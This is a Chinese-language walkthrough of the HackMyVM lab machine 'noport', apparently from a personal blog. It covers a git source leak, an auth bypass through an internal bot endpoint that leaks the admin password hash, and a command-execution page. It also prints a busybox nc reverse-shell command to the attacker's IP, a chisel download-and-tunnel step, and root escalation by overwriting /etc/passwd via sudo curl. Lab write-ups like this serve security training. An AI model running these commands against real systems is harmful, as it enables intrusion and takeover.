---
title: hackmyvm-noport
date: 2025-10-07
categories: [靶机]
tags: [hmv]     # TAG names should always be lowercase
---

### 1.主机发现

靶机ip地址为192.168.56.145

```bash
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:84:cf:10, IPv4: 192.168.56.88
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:19       (Unknown: locally administered)
192.168.56.100  08:00:27:e0:d5:e9       PCS Systemtechnik GmbH
192.168.56.145  08:00:27:eb:86:bf       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.128 seconds (120.30 hosts/sec). 3 responded
                                                                                         
```



### 2.端口扫描

```
└─# nmap -Pn $ip -p-   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-03 23:14 CST
Nmap scan report for 192.168.56.145
Host is up (0.00077s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:EB:86:BF (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 117.65 seconds
```

发现只开放了一个80端口，就连22端口都没扫到，结合靶机名字noport，可以初步认为这是正常的，udp扫描也没有结果



### 3. Web

```
└─# dirb http://$ip                                                     

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Oct  3 23:19:22 2025
URL_BASE: http://192.168.56.145/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.145/ ----
+ http://192.168.56.145/.git/HEAD (CODE:200|SIZE:23)                                                                                                                                                             
(!) WARNING: All responses for this directory seem to be CODE = 401.                                                                                                                                             
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Oct  3 23:19:23 2025
DOWNLOADED: 109 - FOUND: 1
```

发现似乎有git泄露，使用工具扒下来

```
┌──(root㉿PH)-[~/exp/GitTools/Dumper/results]
└─# ls -al
总计 44
drwxr-xr-x 3 root root  4096 10月 3日 17:37 .
drwxr-xr-x 4 root root  4096 10月 3日 17:36 ..
-rw-r--r-- 1 root root  1044 10月 3日 17:36 ctf.conf
drwxr-xr-x 6 root root  4096 10月 3日 17:36 .git
-rw-r--r-- 1 root root   307 10月 3日 17:36 .htaccess
-rw-r--r-- 1 root root  3951 10月 3日 17:36 index.php
-rwxr-xr-x 1 root root  1535 10月 3日 17:36 nginx.conf
-rw-r--r-- 1 root root  2433 10月 3日 17:37 test.php
-rw-r--r-- 1 root root 12288 10月 3日 17:36 .test.php.swp
```

我们可以发现有源码泄露

+ **index.php**

```
┌──(root㉿PH)-[~/exp/GitTools/Dumper/results]
└─# cat index.php 
<?php
session_start();
$uri = $_SERVER['REQUEST_URI'];
$path = trim(parse_url($uri, PHP_URL_PATH), '/');

function verify_user() {
    if (!isset($_SESSION['username'])) {
        header('HTTP/1.1 401 Unauthorized');
        echo json_encode(["error" => "Please login first"]);
        exit;
    }
    return $_SESSION['username'];
}

function get_db_connection() {
    $db = new SQLite3('/var/www/html/database.db');
    return $db;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $path === 'visit') {
    #$username = verify_user();
    $uri = $_POST['uri'] ?? '';
    if (empty($uri)) {
        header('HTTP/1.1 400 Bad Request');
        echo json_encode(["error" => "URI is required"]);
        exit;
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://127.0.0.1:8080/test.php?uri=" . urlencode($uri));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Host: 127.0.0.1:8080"  
    ]);
    $res=curl_exec($ch);
    if (curl_errno($ch)) {
        error_log("cURL error calling test.php: " . curl_error($ch));
    } else {
        error_log("test.php response: " . $response);
    }
    curl_close($ch);

    header('Content-Type: application/json');
    echo json_encode(["message" => "Bot is visiting: $uri"]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $path === 'login') {
    $username = $_POST['username'] ?? '';
    $password = hash('sha256', $_POST['password']) ?? '';
     
    $db = get_db_connection();
    $stmt = $db->prepare('SELECT * FROM users WHERE username = :username AND password = :password');
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $stmt->bindValue(':password', $password, SQLITE3_TEXT);
    $result = $stmt->execute();
    $user = $result->fetchArray(SQLITE3_ASSOC);
     
    if ($user) {
            $_SESSION['username'] = $user['username'];
            echo json_encode(["message" => "Logged in successfully"]);
            header('Location: sh3ll.php');
    } else {
        header('HTTP/1.1 401 Unauthorized');
        echo json_encode(["error" => "Invalid credentials"]);
    }
    $db->close();
    exit;
}

if (!empty($path)) {
    $username = verify_user();
    $db = get_db_connection();
    if (preg_match('/^profile/', $path)) {
        $stmt = $db->prepare('SELECT id, username, email, password, api_key, created_at FROM users WHERE username = :username');
        $stmt->bindValue(':username', $username, SQLITE3_TEXT);
        $result = $stmt->execute();
        $user = $result->fetchArray(SQLITE3_ASSOC);

        if ($user) {
            header('Content-Type: application/json');
                header_remove("Cache-Control");
                header_remove("Pragma");
                header_remove("Expires");
            echo json_encode([
                "id" => $user['id'],
                "username" => $user['username'],
                "email" => $user['email'],
                "password" => $user['password'],
                "api_key" => $user['api_key'],
                "created_at" => $user['created_at']
            ]);
        } else {
            header('HTTP/1.1 404 Not Found');
                header_remove("Cache-Control");
                header_remove("Pragma");
                header_remove("Expires");
            echo json_encode(["error" => "User not found"]);
        }
    } else {
        $file_path = '/var/www/html/' . $path;
        if (file_exists($file_path)) {
            readfile($file_path); 
        } else {
                header('HTTP/1.1 404 Not Found');
                header_remove("Cache-Control");
                header_remove("Pragma");
                header_remove("Expires");
            echo json_encode(["error" => "No match"]);
        }
    }
    $db->close();
    exit;
}


?>
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
    <h2>Login</h2>
    <form method="post" action="/login">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
```
+  **test.php**

```
┌──(root㉿PH)-[~/exp/GitTools/Dumper/results]
└─# cat test.php 
<?php
//czj
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') {
    header('HTTP/1.1 403 Forbidden');
    echo "Access Denied";
    exit;
}

$admin_password=getenv('ADMIN_PASS');
$base_url = 'http://127.0.0.1:80'; 
$log_file = __DIR__ . '/log';


function write_log($message) {
    global $log_file;
    $timestamp = date('Y-m-d H:i:s');
    $log_entry = "[$timestamp] $message\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND);
}

function login_and_get_cookie() {
    global $base_url, $admin_password;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$base_url/login");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'username' => 'admin',
        'password' => $admin_password
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, '');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);

    $headers = [
        'User-Agent: Bot',
        'Accept: application/json',
        'Content-Type: application/x-www-form-urlencoded'
    ];
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        write_log("cURL login error: " . curl_error($ch));
        curl_close($ch);
        return null;
    }

    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header = substr($response, 0, $header_size);
    curl_close($ch);

    preg_match('/PHPSESSID=([^;]+)/', $header, $matches);
    return $matches[1] ?? null;
}

function bot_runner($uri) {
    global $base_url;
    $cookie = login_and_get_cookie();
    
    if (!$cookie) {
        write_log("Failed to get admin cookie");
        return;
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$base_url/$uri");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=$cookie");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, '');
   
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        write_log("cURL visit error: " . curl_error($ch));
    } else {
        write_log("Bot visited $uri, response: " . substr($response, 0, 100));
    }
    curl_close($ch);
    sleep(1);
}

if (isset($_GET['uri'])) {
    $uri = $_GET['uri'];
    write_log("Bot triggered for URI: $uri");
    bot_runner($uri);
    echo "Bot executed";
}
```

通过代码审计，我们通过使用POST方法加参数uri访问visit路径时，就能绕过身份验证，而且当``uri=profile``时，就能在/log路径下发现从数据库泄露出来的密码

```
┌──(root㉿PH)-[~/exp/GitTools/Dumper/results]
└─# curl http://192.168.56.145/visit -X POST -d 'uri=profile'    
{"message":"Bot is visiting: profile"}                                                                                                                                                                                                                  
┌──(root㉿PH)-[~/exp/GitTools/Dumper/results]
└─# curl http://192.168.56.145/log                           
[2025-10-03 21:16:11] Bot visited a, response: {"error":"No match"}
[2025-10-03 21:16:28] Bot visited profile, response: {"id":1,"username":"admin","email":"admin@example.com","password":"6f06ee724b86fca512018ad692a62aedc
```

[cmd5](https://www.cmd5.com/)解码后发现密码是**shredder1**

拿到密码后使用`admin:shredder1` 登录80的登录框，登录进来后发现是一个执行命令的框

然后我反弹shell `busybox nc 192.168.56.88 1234 -e /bin/bash`，找到用户有一个**akaRed**

但他给我的shell不可以进行终端升级，这就有点难受了，硬着头皮发现一个文件,告诉你密码复用

```
cat pass
To prevent myself fron forgetting my password,i set my password to be the same as the website password so that i wont forget it!
```

但是呢不能su，而且靶机22端口也没开，那就只能进行打洞了,这里留一个小问题，就是我们使用socat将2222端口转发到22端口，发现使用nmap扫描是filtered，所以就可以猜测我们从外部是无法访问内部的（这个待会解释），除了这个开放的80端口。那么就只能通过让靶机来连接我们，chisel打洞的原理就是在攻击机上开启一个服务，让靶机作为客户端来和我们连接，接着在攻击机上开启一个端口来和靶机通信

```
靶机
cd /tmp
wget 192.168.56.88/chisel
chmod +x chisel
./chisel client 192.168.56.88:8888 R:2222:127.0.0.1:22
```

```
攻击机
chisel server -p 8888 --reverse
```

接着我们`ssh akaRed@192.168.56.88 -p 2222 ` 就能连接上靶机了

`sudo -l`发现能执行**curl**，那就很简单了

```
cp /etc/passwd .
echo 'ph:$1$IGhNPKEe$KyeV5i5EA1VYYO8vVueAF.:0:0:root:/root:/bin/bash' >> passwd
sudo curl file:///home/akaRed/passwd -o /etc/passwd
ssh ph@localhost   密码111
```

拿到root了



### 4. flag展示

---

```
root: flag{Ur_t3h_Trvelyn3tvv0rk@ce_on_QQGroup}
user: flag{UR_s0Good*n-n3tvv0rk_For_660930334}
```

---



### 5.收获

我们查看防火墙规则

```
noport:~# iptables -L  -n -v --line-numbers
Chain INPUT (policy DROP 12 packets, 4377 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
1     200K   23M ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0           
2    24676   12M ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
3      389 20572 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 ctstate NEW
4        7   280 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate INVALID
5        0     0            tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 ctstate NEW recent: SET name: HTTP side: source mask: 255.255.255.255
6        0     0 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 ctstate NEW recent: UPDATE seconds: 30 hit_count: 10 name: HTTP side: source mask: 255.255.255.255

Chain FORWARD (policy DROP 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy DROP 6 packets, 1968 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
1     200K   23M ACCEPT     all  --  *      lo      0.0.0.0/0            0.0.0.0/0           
2    30770 9331K ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
3       11   660 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0           
```

**对于入站规则，有三条accept,第一条是针对本地回环地址lo,第二条是对已建立连接的通信（这个一般都有，为了正常的网络通信），第三条是只接受80端口的TCP连接，而剩下的都drop掉了。**

**对于出站规则，有三条accept,第一天还是针对本地回环，第二条是对已建立连接的通信，第三条是允许TCP出站（这也就是靶机不能ping攻击机的原因，ping属于ICMP,而出站没有规则匹配）**

**所以说，我们就算使用socat将22端口转发到2222，我们也无法连接到2222，这是因为入站规则只允许80端口的TCP连接，对于其他端口的都drop了。而为什么使用chisel能行呢，是因为出站规则允许TCP出去，可以从内网出去连接到攻击机，又因为防火墙规则允许已建立连接的通信入站和出站，所以我们能成功**



